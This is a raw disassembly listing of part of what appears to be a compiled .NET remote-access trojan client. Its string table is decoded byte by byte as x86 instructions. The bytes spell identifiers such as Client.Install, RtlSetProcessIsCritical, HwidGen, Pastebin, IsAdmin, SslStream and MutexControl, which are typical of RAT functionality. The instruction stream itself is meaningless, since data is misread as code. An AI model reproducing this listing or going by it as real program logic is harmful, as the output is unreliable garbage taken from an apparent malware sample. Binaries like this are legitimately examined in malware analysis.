  406433:	00 55 72             	add    %dl,0x72(%ebp)
  406436:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  40643c:	00 6f 62             	add    %ch,0x62(%edi)
  40643f:	6a 00                	push   $0x0
  406441:	4d                   	dec    %ebp
  406442:	65 73 73             	gs jae 0x4064b8
  406445:	61                   	popa
  406446:	67 65 50             	addr16 gs push %eax
  406449:	61                   	popa
  40644a:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  40644d:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  406454:	61                   	popa
  406455:	67 65 50             	addr16 gs push %eax
  406458:	61                   	popa
  406459:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40645c:	4d                   	dec    %ebp
  40645d:	73 67                	jae    0x4064c6
  40645f:	50                   	push   %eax
  406460:	61                   	popa
  406461:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  406464:	41                   	inc    %ecx
  406465:	73 79                	jae    0x4064e0
  406467:	6e                   	outsb  %ds:(%esi),(%dx)
  406468:	63 43 61             	arpl   %eax,0x61(%ebx)
  40646b:	6c                   	insb   (%dx),%es:(%edi)
  40646c:	6c                   	insb   (%dx),%es:(%edi)
  40646d:	62 61 63             	bound  %esp,0x63(%ecx)
  406470:	6b 00 52             	imul   $0x52,(%eax),%eax
  406473:	65 6d                	gs insl (%dx),%es:(%edi)
  406475:	6f                   	outsl  %ds:(%esi),(%dx)
  406476:	74 65                	je     0x4064dd
  406478:	43                   	inc    %ebx
  406479:	65 72 74             	gs jb  0x4064f0
  40647c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406483:	56                   	push   %esi
  406484:	61                   	popa
  406485:	6c                   	insb   (%dx),%es:(%edi)
  406486:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40648d:	43 
  40648e:	61                   	popa
  40648f:	6c                   	insb   (%dx),%es:(%edi)
  406490:	6c                   	insb   (%dx),%es:(%edi)
  406491:	62 61 63             	bound  %esp,0x63(%ecx)
  406494:	6b 00 54             	imul   $0x54,(%eax),%eax
  406497:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40649e:	6c                   	insb   (%dx),%es:(%edi)
  40649f:	62 61 63             	bound  %esp,0x63(%ecx)
  4064a2:	6b 00 75             	imul   $0x75,(%eax),%eax
  4064a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4064a6:	70 61                	jo     0x406509
  4064a8:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  4064ab:	6d                   	insl   (%dx),%es:(%edi)
  4064ac:	73 67                	jae    0x406515
  4064ae:	70 61                	jo     0x406511
  4064b0:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064b3:	52                   	push   %edx
  4064b4:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4064bb:	4b 65 
  4064bd:	79 50                	jns    0x40650f
  4064bf:	65 72 6d             	gs jb  0x40652f
  4064c2:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  4064c9:	68 65 63 6b 00       	push   $0x6b6365
  4064ce:	46                   	inc    %esi
  4064cf:	6c                   	insb   (%dx),%es:(%edi)
  4064d0:	75 73                	jne    0x406545
  4064d2:	68 46 69 6e 61       	push   $0x616e6946
  4064d7:	6c                   	insb   (%dx),%es:(%edi)
  4064d8:	42                   	inc    %edx
  4064d9:	6c                   	insb   (%dx),%es:(%edi)
  4064da:	6f                   	outsl  %ds:(%esi),(%dx)
  4064db:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064de:	49                   	dec    %ecx
  4064df:	73 53                	jae    0x406534
  4064e1:	6d                   	insl   (%dx),%es:(%edi)
  4064e2:	61                   	popa
  4064e3:	6c                   	insb   (%dx),%es:(%edi)
  4064e4:	6c                   	insb   (%dx),%es:(%edi)
  4064e5:	44                   	inc    %esp
  4064e6:	69 73 6b 00 52 74 6c 	imul   $0x6c745200,0x6b(%ebx),%esi
  4064ed:	53                   	push   %ebx
  4064ee:	65 74 50             	gs je  0x406541
  4064f1:	72 6f                	jb     0x406562
  4064f3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4064f6:	73 49                	jae    0x406541
  4064f8:	73 43                	jae    0x40653d
  4064fa:	72 69                	jb     0x406565
  4064fc:	74 69                	je     0x406567
  4064fe:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406501:	00 50 72             	add    %dl,0x72(%eax)
  406504:	6f                   	outsl  %ds:(%esi),(%dx)
  406505:	63 65 73             	arpl   %esp,0x73(%ebp)
  406508:	73 43                	jae    0x40654d
  40650a:	72 69                	jb     0x406575
  40650c:	74 69                	je     0x406577
  40650e:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406511:	00 4e 65             	add    %cl,0x65(%esi)
  406514:	74 77                	je     0x40658d
  406516:	6f                   	outsl  %ds:(%esi),(%dx)
  406517:	72 6b                	jb     0x406584
  406519:	43                   	inc    %ebx
  40651a:	72 65                	jb     0x406581
  40651c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40651f:	74 69                	je     0x40658a
  406521:	61                   	popa
  406522:	6c                   	insb   (%dx),%es:(%edi)
  406523:	00 53 79             	add    %dl,0x79(%ebx)
  406526:	73 74                	jae    0x40659c
  406528:	65 6d                	gs insl (%dx),%es:(%edi)
  40652a:	2e 53                	cs push %ebx
  40652c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406530:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  406537:	6e 
  406538:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40653b:	61                   	popa
  40653c:	6c                   	insb   (%dx),%es:(%edi)
  40653d:	00 57 69             	add    %dl,0x69(%edi)
  406540:	6e                   	outsb  %ds:(%esi),(%dx)
  406541:	64 6f                	outsl  %fs:(%esi),(%dx)
  406543:	77 73                	ja     0x4065b8
  406545:	50                   	push   %eax
  406546:	72 69                	jb     0x4065b1
  406548:	6e                   	outsb  %ds:(%esi),(%dx)
  406549:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40654c:	61                   	popa
  40654d:	6c                   	insb   (%dx),%es:(%edi)
  40654e:	00 41 72             	add    %al,0x72(%ecx)
  406551:	65 45                	gs inc %ebp
  406553:	71 75                	jno    0x4065ca
  406555:	61                   	popa
  406556:	6c                   	insb   (%dx),%es:(%edi)
  406557:	00 67 65             	add    %ah,0x65(%edi)
  40655a:	74 5f                	je     0x4065bb
  40655c:	49                   	dec    %ecx
  40655d:	6e                   	outsb  %ds:(%esi),(%dx)
  40655e:	74 65                	je     0x4065c5
  406560:	72 76                	jb     0x4065d8
  406562:	61                   	popa
  406563:	6c                   	insb   (%dx),%es:(%edi)
  406564:	00 73 65             	add    %dh,0x65(%ebx)
  406567:	74 5f                	je     0x4065c8
  406569:	49                   	dec    %ecx
  40656a:	6e                   	outsb  %ds:(%esi),(%dx)
  40656b:	74 65                	je     0x4065d2
  40656d:	72 76                	jb     0x4065e5
  40656f:	61                   	popa
  406570:	6c                   	insb   (%dx),%es:(%edi)
  406571:	00 43 6c             	add    %al,0x6c(%ebx)
  406574:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40657b:	73 74                	jae    0x4065f1
  40657d:	61                   	popa
  40657e:	6c                   	insb   (%dx),%es:(%edi)
  40657f:	6c                   	insb   (%dx),%es:(%edi)
  406580:	00 6b 65             	add    %ch,0x65(%ebx)
  406583:	72 6e                	jb     0x4065f3
  406585:	65 6c                	gs insb (%dx),%es:(%edi)
  406587:	33 32                	xor    (%edx),%esi
  406589:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40658c:	6c                   	insb   (%dx),%es:(%edi)
  40658d:	00 75 73             	add    %dh,0x73(%ebp)
  406590:	65 72 33             	gs jb  0x4065c6
  406593:	32 2e                	xor    (%esi),%ch
  406595:	64 6c                	fs insb (%dx),%es:(%edi)
  406597:	6c                   	insb   (%dx),%es:(%edi)
  406598:	00 6e 74             	add    %ch,0x74(%esi)
  40659b:	64 6c                	fs insb (%dx),%es:(%edi)
  40659d:	6c                   	insb   (%dx),%es:(%edi)
  40659e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4065a1:	6c                   	insb   (%dx),%es:(%edi)
  4065a2:	00 4b 69             	add    %cl,0x69(%ebx)
  4065a5:	6c                   	insb   (%dx),%es:(%edi)
  4065a6:	6c                   	insb   (%dx),%es:(%edi)
  4065a7:	00 50 6f             	add    %dl,0x6f(%eax)
  4065aa:	6c                   	insb   (%dx),%es:(%edi)
  4065ab:	6c                   	insb   (%dx),%es:(%edi)
  4065ac:	00 4d 75             	add    %cl,0x75(%ebp)
  4065af:	74 65                	je     0x406616
  4065b1:	78 43                	js     0x4065f6
  4065b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4065b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4065b5:	74 72                	je     0x406629
  4065b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4065b8:	6c                   	insb   (%dx),%es:(%edi)
  4065b9:	00 46 69             	add    %al,0x69(%esi)
  4065bc:	6c                   	insb   (%dx),%es:(%edi)
  4065bd:	65 53                	gs push %ebx
  4065bf:	74 72                	je     0x406633
  4065c1:	65 61                	gs popa
  4065c3:	6d                   	insl   (%dx),%es:(%edi)
  4065c4:	00 4e 65             	add    %cl,0x65(%esi)
  4065c7:	74 77                	je     0x406640
  4065c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4065ca:	72 6b                	jb     0x406637
  4065cc:	53                   	push   %ebx
  4065cd:	74 72                	je     0x406641
  4065cf:	65 61                	gs popa
  4065d1:	6d                   	insl   (%dx),%es:(%edi)
  4065d2:	00 53 73             	add    %dl,0x73(%ebx)
  4065d5:	6c                   	insb   (%dx),%es:(%edi)
  4065d6:	53                   	push   %ebx
  4065d7:	74 72                	je     0x40664b
  4065d9:	65 61                	gs popa
  4065db:	6d                   	insl   (%dx),%es:(%edi)
  4065dc:	00 43 72             	add    %al,0x72(%ebx)
  4065df:	79 70                	jns    0x406651
  4065e1:	74 6f                	je     0x406652
  4065e3:	53                   	push   %ebx
  4065e4:	74 72                	je     0x406658
  4065e6:	65 61                	gs popa
  4065e8:	6d                   	insl   (%dx),%es:(%edi)
  4065e9:	00 4d 65             	add    %cl,0x65(%ebp)
  4065ec:	6d                   	insl   (%dx),%es:(%edi)
  4065ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4065ee:	72 79                	jb     0x406669
  4065f0:	53                   	push   %ebx
  4065f1:	74 72                	je     0x406665
  4065f3:	65 61                	gs popa
  4065f5:	6d                   	insl   (%dx),%es:(%edi)
  4065f6:	00 50 72             	add    %dl,0x72(%eax)
  4065f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4065fa:	67 72 61             	addr16 jb 0x40665e
  4065fd:	6d                   	insl   (%dx),%es:(%edi)
  4065fe:	00 67 65             	add    %ah,0x65(%edi)
  406601:	74 5f                	je     0x406662
  406603:	49                   	dec    %ecx
  406604:	74 65                	je     0x40666b
  406606:	6d                   	insl   (%dx),%es:(%edi)
  406607:	00 67 65             	add    %ah,0x65(%edi)
  40660a:	74 5f                	je     0x40666b
  40660c:	49                   	dec    %ecx
  40660d:	73 36                	jae    0x406645
  40660f:	34 42                	xor    $0x42,%al
  406611:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  406618:	74 
  406619:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  406620:	65 6d                	gs insl (%dx),%es:(%edi)
  406622:	00 43 6c             	add    %al,0x6c(%ebx)
  406625:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40662c:	67 6f                	outsl  %ds:(%si),(%dx)
  40662e:	72 69                	jb     0x406699
  406630:	74 68                	je     0x40669a
  406632:	6d                   	insl   (%dx),%es:(%edi)
  406633:	00 53 79             	add    %dl,0x79(%ebx)
  406636:	6d                   	insl   (%dx),%es:(%edi)
  406637:	6d                   	insl   (%dx),%es:(%edi)
  406638:	65 74 72             	gs je  0x4066ad
  40663b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  406642:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  406649:	79 
  40664a:	6d                   	insl   (%dx),%es:(%edi)
  40664b:	6d                   	insl   (%dx),%es:(%edi)
  40664c:	65 74 72             	gs je  0x4066c1
  40664f:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  406656:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40665d:	73 
  40665e:	68 41 6c 67 6f       	push   $0x6f676c41
  406663:	72 69                	jb     0x4066ce
  406665:	74 68                	je     0x4066cf
  406667:	6d                   	insl   (%dx),%es:(%edi)
  406668:	00 52 61             	add    %dl,0x61(%edx)
  40666b:	6e                   	outsb  %ds:(%esi),(%dx)
  40666c:	64 6f                	outsl  %fs:(%esi),(%dx)
  40666e:	6d                   	insl   (%dx),%es:(%edi)
  40666f:	00 49 43             	add    %cl,0x43(%ecx)
  406672:	72 79                	jb     0x4066ed
  406674:	70 74                	jo     0x4066ea
  406676:	6f                   	outsl  %ds:(%esi),(%dx)
  406677:	54                   	push   %esp
  406678:	72 61                	jb     0x4066db
  40667a:	6e                   	outsb  %ds:(%esi),(%dx)
  40667b:	73 66                	jae    0x4066e3
  40667d:	6f                   	outsl  %ds:(%esi),(%dx)
  40667e:	72 6d                	jb     0x4066ed
  406680:	00 45 6e             	add    %al,0x6e(%ebp)
  406683:	75 6d                	jne    0x4066f2
  406685:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  406689:	6f                   	outsl  %ds:(%esi),(%dx)
  40668a:	6f                   	outsl  %ds:(%esi),(%dx)
  40668b:	6c                   	insb   (%dx),%es:(%edi)
  40668c:	65 61                	gs popa
  40668e:	6e                   	outsb  %ds:(%esi),(%dx)
  40668f:	00 48 77             	add    %cl,0x77(%eax)
  406692:	69 64 47 65 6e 00 4d 	imul   $0x614d006e,0x65(%edi,%eax,2),%esp
  406699:	61 
  40669a:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4066a1:	43                   	inc    %ebx
  4066a2:	68 61 69 6e 00       	push   $0x6e6961
  4066a7:	63 68 61             	arpl   %ebp,0x61(%eax)
  4066aa:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4066b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4066b2:	6d                   	insl   (%dx),%es:(%edi)
  4066b3:	61                   	popa
  4066b4:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4066bb:	43                   	inc    %ebx
  4066bc:	75 72                	jne    0x406730
  4066be:	72 65                	jb     0x406725
  4066c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4066c1:	74 44                	je     0x406707
  4066c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c4:	6d                   	insl   (%dx),%es:(%edi)
  4066c5:	61                   	popa
  4066c6:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4066cd:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4066d1:	00 49 73             	add    %cl,0x73(%ecx)
  4066d4:	41                   	inc    %ecx
  4066d5:	64 6d                	fs insl (%dx),%es:(%edi)
  4066d7:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4066de:	00 47 65             	add    %al,0x65(%edi)
  4066e1:	74 46                	je     0x406729
  4066e3:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4066ea:	57 
  4066eb:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  4066f2:	78 
  4066f3:	74 65                	je     0x40675a
  4066f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4066f6:	73 69                	jae    0x406761
  4066f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4066f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4066fa:	00 67 65             	add    %ah,0x65(%edi)
  4066fd:	74 5f                	je     0x40675e
  4066ff:	4f                   	dec    %edi
  406700:	53                   	push   %ebx
  406701:	56                   	push   %esi
  406702:	65 72 73             	gs jb  0x406778
  406705:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  40670c:	6c                   	insb   (%dx),%es:(%edi)
  40670d:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  406714:	00 53 79             	add    %dl,0x79(%ebx)
  406717:	73 74                	jae    0x40678d
  406719:	65 6d                	gs insl (%dx),%es:(%edi)
  40671b:	2e 53                	cs push %ebx
  40671d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406721:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  406728:	68 
  406729:	65 6e                	outsb  %gs:(%esi),(%dx)
  40672b:	74 69                	je     0x406796
  40672d:	63 61 74             	arpl   %esp,0x74(%ecx)
  406730:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  406737:	74 65                	je     0x40679e
  406739:	6d                   	insl   (%dx),%es:(%edi)
  40673a:	2e 52                	cs push %edx
  40673c:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40673f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406744:	6e                   	outsb  %ds:(%esi),(%dx)
  406745:	00 58 35             	add    %bl,0x35(%eax)
  406748:	30 39                	xor    %bh,(%ecx)
  40674a:	43                   	inc    %ebx
  40674b:	65 72 74             	gs jb  0x4067c2
  40674e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406755:	43                   	inc    %ebx
  406756:	6f                   	outsl  %ds:(%esi),(%dx)
  406757:	6c                   	insb   (%dx),%es:(%edi)
  406758:	6c                   	insb   (%dx),%es:(%edi)
  406759:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40675e:	6e                   	outsb  %ds:(%esi),(%dx)
  40675f:	00 4d 61             	add    %cl,0x61(%ebp)
  406762:	6e                   	outsb  %ds:(%esi),(%dx)
  406763:	61                   	popa
  406764:	67 65 6d             	gs insl (%dx),%es:(%di)
  406767:	65 6e                	outsb  %gs:(%esi),(%dx)
  406769:	74 4f                	je     0x4067ba
  40676b:	62 6a 65             	bound  %ebp,0x65(%edx)
  40676e:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  406772:	6c                   	insb   (%dx),%es:(%edi)
  406773:	6c                   	insb   (%dx),%es:(%edi)
  406774:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406779:	6e                   	outsb  %ds:(%esi),(%dx)
  40677a:	00 43 6c             	add    %al,0x6c(%ebx)
  40677d:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  406784:	6e                   	outsb  %ds:(%esi),(%dx)
  406785:	6e                   	outsb  %ds:(%esi),(%dx)
  406786:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40678b:	6e                   	outsb  %ds:(%esi),(%dx)
  40678c:	00 73 65             	add    %dh,0x65(%ebx)
  40678f:	74 5f                	je     0x4067f0
  406791:	50                   	push   %eax
  406792:	6f                   	outsl  %ds:(%esi),(%dx)
  406793:	73 69                	jae    0x4067fe
  406795:	74 69                	je     0x406800
  406797:	6f                   	outsl  %ds:(%esi),(%dx)
  406798:	6e                   	outsb  %ds:(%esi),(%dx)
  406799:	00 43 72             	add    %al,0x72(%ebx)
  40679c:	79 70                	jns    0x40680e
  40679e:	74 6f                	je     0x40680f
  4067a0:	67 72 61             	addr16 jb 0x406804
  4067a3:	70 68                	jo     0x40680d
  4067a5:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4067ac:	74 69                	je     0x406817
  4067ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4067af:	6e                   	outsb  %ds:(%esi),(%dx)
  4067b0:	00 41 72             	add    %al,0x72(%ecx)
  4067b3:	67 75 6d             	addr16 jne 0x406823
  4067b6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067b8:	74 4e                	je     0x406808
  4067ba:	75 6c                	jne    0x406828
  4067bc:	6c                   	insb   (%dx),%es:(%edi)
  4067bd:	45                   	inc    %ebp
  4067be:	78 63                	js     0x406823
  4067c0:	65 70 74             	gs jo  0x406837
  4067c3:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  4067ca:	75 6d                	jne    0x406839
  4067cc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067ce:	74 45                	je     0x406815
  4067d0:	78 63                	js     0x406835
  4067d2:	65 70 74             	gs jo  0x406849
  4067d5:	69 6f 6e 00 49 6d 61 	imul   $0x616d4900,0x6e(%edi),%ebp
  4067dc:	67 65 43             	addr16 gs inc %ebx
  4067df:	6f                   	outsl  %ds:(%esi),(%dx)
  4067e0:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4067e5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067e7:	00 53 65             	add    %dl,0x65(%ebx)
  4067ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4067eb:	64 49                	fs dec %ecx
  4067ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4067ee:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067f0:	00 46 69             	add    %al,0x69(%esi)
  4067f3:	6c                   	insb   (%dx),%es:(%edi)
  4067f4:	65 49                	gs dec %ecx
  4067f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4067f7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067f9:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4067fd:	76 65                	jbe    0x406864
  4067ff:	49                   	dec    %ecx
  406800:	6e                   	outsb  %ds:(%esi),(%dx)
  406801:	66 6f                	outsw  %ds:(%esi),(%dx)
  406803:	00 46 69             	add    %al,0x69(%esi)
  406806:	6c                   	insb   (%dx),%es:(%edi)
  406807:	65 53                	gs push %ebx
  406809:	79 73                	jns    0x40687e
  40680b:	74 65                	je     0x406872
  40680d:	6d                   	insl   (%dx),%es:(%edi)
  40680e:	49                   	dec    %ecx
  40680f:	6e                   	outsb  %ds:(%esi),(%dx)
  406810:	66 6f                	outsw  %ds:(%esi),(%dx)
  406812:	00 43 6f             	add    %al,0x6f(%ebx)
  406815:	6d                   	insl   (%dx),%es:(%edi)
  406816:	70 75                	jo     0x40688d
  406818:	74 65                	je     0x40687f
  40681a:	72 49                	jb     0x406865
  40681c:	6e                   	outsb  %ds:(%esi),(%dx)
  40681d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40681f:	00 43 53             	add    %al,0x53(%ebx)
  406822:	68 61 72 70 41       	push   $0x41707261
  406827:	72 67                	jb     0x406890
  406829:	75 6d                	jne    0x406898
  40682b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40682d:	74 49                	je     0x406878
  40682f:	6e                   	outsb  %ds:(%esi),(%dx)
  406830:	66 6f                	outsw  %ds:(%esi),(%dx)
  406832:	00 50 72             	add    %dl,0x72(%eax)
  406835:	6f                   	outsl  %ds:(%esi),(%dx)
  406836:	63 65 73             	arpl   %esp,0x73(%ebp)
  406839:	73 53                	jae    0x40688e
  40683b:	74 61                	je     0x40689e
  40683d:	72 74                	jb     0x4068b3
  40683f:	49                   	dec    %ecx
  406840:	6e                   	outsb  %ds:(%esi),(%dx)
  406841:	66 6f                	outsw  %ds:(%esi),(%dx)
  406843:	00 50 72             	add    %dl,0x72(%eax)
  406846:	65 76 65             	gs jbe 0x4068ae
  406849:	6e                   	outsb  %ds:(%esi),(%dx)
  40684a:	74 53                	je     0x40689f
  40684c:	6c                   	insb   (%dx),%es:(%edi)
  40684d:	65 65 70 00          	gs gs jo 0x406851
  406851:	5a                   	pop    %edx
  406852:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  406859:	65 6e                	outsb  %gs:(%esi),(%dx)
  40685b:	74 41                	je     0x40689e
  40685d:	70 70                	jo     0x4068cf
  40685f:	00 4d 69             	add    %cl,0x69(%ebp)
  406862:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406865:	73 6f                	jae    0x4068d6
  406867:	66 74 2e             	data16 je 0x406898
  40686a:	43                   	inc    %ebx
  40686b:	53                   	push   %ebx
  40686c:	68 61 72 70 00       	push   $0x707261
  406871:	47                   	inc    %edi
  406872:	72 6f                	jb     0x4068e3
  406874:	75 70                	jne    0x4068e6
  406876:	00 4e 6f             	add    %cl,0x6f(%esi)
  406879:	72 6d                	jb     0x4068e8
  40687b:	61                   	popa
  40687c:	6c                   	insb   (%dx),%es:(%edi)
  40687d:	53                   	push   %ebx
  40687e:	74 61                	je     0x4068e1
  406880:	72 74                	jb     0x4068f6
  406882:	75 70                	jne    0x4068f4
  406884:	00 53 79             	add    %dl,0x79(%ebx)
  406887:	73 74                	jae    0x4068fd
  406889:	65 6d                	gs insl (%dx),%es:(%edi)
  40688b:	2e 4c                	cs dec %esp
  40688d:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  406894:	72 00                	jb     0x406896
  406896:	49                   	dec    %ecx
  406897:	6e                   	outsb  %ds:(%esi),(%dx)
  406898:	76 6f                	jbe    0x406909
  40689a:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40689e:	6d                   	insl   (%dx),%es:(%edi)
  40689f:	62 65 72             	bound  %esp,0x72(%ebp)
  4068a2:	00 4d 44             	add    %cl,0x44(%ebp)
  4068a5:	35 43 72 79 70       	xor    $0x70797243,%eax
  4068aa:	74 6f                	je     0x40691b
  4068ac:	53                   	push   %ebx
  4068ad:	65 72 76             	gs jb  0x406926
  4068b0:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4068b7:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4068be:	41 
  4068bf:	43                   	inc    %ebx
  4068c0:	72 79                	jb     0x40693b
  4068c2:	70 74                	jo     0x406938
  4068c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c5:	53                   	push   %ebx
  4068c6:	65 72 76             	gs jb  0x40693f
  4068c9:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4068d0:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4068d7:	73 
  4068d8:	43                   	inc    %ebx
  4068d9:	72 79                	jb     0x406954
  4068db:	70 74                	jo     0x406951
  4068dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4068de:	53                   	push   %ebx
  4068df:	65 72 76             	gs jb  0x406958
  4068e2:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4068e9:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4068f0:	72 
  4068f1:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4068f8:	64 65 72 00          	fs gs jb 0x4068fc
  4068fc:	49                   	dec    %ecx
  4068fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4068fe:	73 74                	jae    0x406974
  406900:	61                   	popa
  406901:	6c                   	insb   (%dx),%es:(%edi)
  406902:	6c                   	insb   (%dx),%es:(%edi)
  406903:	46                   	inc    %esi
  406904:	6f                   	outsl  %ds:(%esi),(%dx)
  406905:	6c                   	insb   (%dx),%es:(%edi)
  406906:	64 65 72 00          	fs gs jb 0x40690a
  40690a:	49                   	dec    %ecx
  40690b:	64 53                	fs push %ebx
  40690d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40690f:	64 65 72 00          	fs gs jb 0x406913
  406913:	73 65                	jae    0x40697a
  406915:	6e                   	outsb  %ds:(%esi),(%dx)
  406916:	64 65 72 00          	fs gs jb 0x40691a
  40691a:	4d                   	dec    %ebp
  40691b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406922:	74 2e                	je     0x406952
  406924:	43                   	inc    %ebx
  406925:	53                   	push   %ebx
  406926:	68 61 72 70 2e       	push   $0x2e707261
  40692b:	52                   	push   %edx
  40692c:	75 6e                	jne    0x40699c
  40692e:	74 69                	je     0x406999
  406930:	6d                   	insl   (%dx),%es:(%edi)
  406931:	65 42                	gs inc %edx
  406933:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  40693a:	61                   	popa
  40693b:	6c                   	insb   (%dx),%es:(%edi)
  40693c:	6c                   	insb   (%dx),%es:(%edi)
  40693d:	53                   	push   %ebx
  40693e:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  406945:	65 
  406946:	72 00                	jb     0x406948
  406948:	47                   	inc    %edi
  406949:	65 74 45             	gs je  0x406991
  40694c:	6e                   	outsb  %ds:(%esi),(%dx)
  40694d:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406950:	65 72 00             	gs jb  0x406953
  406953:	67 65 74 5f          	addr16 gs je 0x4069b6
  406957:	42                   	inc    %edx
  406958:	75 66                	jne    0x4069c0
  40695a:	66 65 72 00          	data16 gs jb 0x40695e
  40695e:	73 65                	jae    0x4069c5
  406960:	74 5f                	je     0x4069c1
  406962:	42                   	inc    %edx
